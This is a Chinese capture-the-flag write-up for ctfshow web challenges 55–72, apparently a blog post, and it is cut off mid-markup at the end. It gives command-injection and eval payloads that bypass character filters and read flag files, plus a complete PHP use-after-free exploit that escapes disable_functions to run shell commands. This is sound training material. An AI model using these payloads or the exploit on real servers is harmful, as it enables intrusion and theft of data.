<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

见下题

## web56

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

这两道题，后一道题只是比前一道题多出了一个过滤数字

解法是类似的 

#### 方法一

第一种方法仅针对第一题而言

正常命令应该是

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

需要绕过字母，因此可以使用?进行匹配

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????????</span><br></pre></td></tr></table></figure>

#### 方法二

本题的关键是先构造一个上传的数据包，然后利用.执行保存再临时文件目录下的的sh文件命令

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[]</span><br></pre></td></tr></table></figure>

这边比较有趣的一个思路就是使用[]范围限制控制大小写的匹配，具体参照P神的这篇文章

[无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

## web57

### 源码

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 还能炫的动吗？</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

本题是一个数字过滤的问题，首先了解一个

 \$(())=0，对其进行取反得到\$(( ~$(()) ))=1，然后再此基础上取值为36

对于36，首先对其进行取反，得到为-37，然后利用-1进行加和，最终得到36

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>

## web58

### 源码

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

### payload

#### 方法一

include+伪协议绕过

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include($_POST[&#x27;w&#x27;]);&amp;w=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

#### 方法二

直接使用highlight_file显示页面

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>

## web59

## web60

## web61

## web62

## web63

## web64

## web65

这两题跟58用同一个都能打通，因为是黑盒，也不确定到底是禁了什么函数

## web66

黑盒，无源码

### payload

1. 首先查看目录

   都是使用了scandir函数对根目录进行罗列，区别在于使用的回显函数

   **方法一**

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure>

   **方法二**

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

2. 查看文件内容

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(&quot;../../../../../flag.txt&quot;);</span><br></pre></td></tr></table></figure>

   可以参考上面，这边只给出一个实例

## web67

### payload

print_r函数被禁用，使用另一个就行

## web68

### payload

禁用了highlight_file等，然后这边使用另外一个readgzfile，查看内容与上一题一样

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&quot;/&quot;)); </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=readgzfile(&quot;/flag.txt&quot;);</span><br></pre></td></tr></table></figure>

## web69

### payload

只是每题禁用了不同的函数，寻找合适的替换就行

1. 首先查看目录

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

2. 查看文件内容

   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=readgzfile(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>


## web70

同69仍然可以生效

## web71

### 源码

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>

### payload

查看源码，在命令执行后回显页面前先将内容进行替换

#### 方法一

缓冲区劫持，可利用函数

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ob_flush();</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);ob_flush();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);ob_end_flush();</span><br></pre></td></tr></table></figure>

#### 方法二

命令执行之后就对程序进行退出操作

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);die();</span><br></pre></td></tr></table></figure>

## web72

### payload

本题查找的payload还能看懂，但是后面读取不是很理解

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

下面是对open_basedir()的绕过操作，没太看明白，需要再研究

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span 